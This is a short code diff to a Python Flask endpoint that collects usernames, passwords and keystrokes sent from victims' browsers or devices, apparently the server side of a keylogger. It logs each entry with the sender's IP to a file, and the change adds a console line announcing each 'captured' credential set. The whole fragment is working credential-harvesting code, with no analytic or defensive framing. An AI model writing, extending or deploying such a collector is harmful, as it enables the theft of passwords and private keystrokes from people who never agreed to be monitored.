@@ -8,6 +8,8 @@ def log_keypress():
     data = request.get_json()
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
+    print(f">> Capturado desde IP {user_ip}: Usuario: {data.get('u')}, Clave: {data.get('p')}, Teclas: {data.get('k')}")
+
     with open("keylog.txt", "a") as f:
         f.write(f"[{datetime.datetime.now()}] IP: {user_ip} | Usuario: {data.get('u')}, Clave: {data.get('p')}, Teclas: {data.get('k')}\n")
     return '', 204
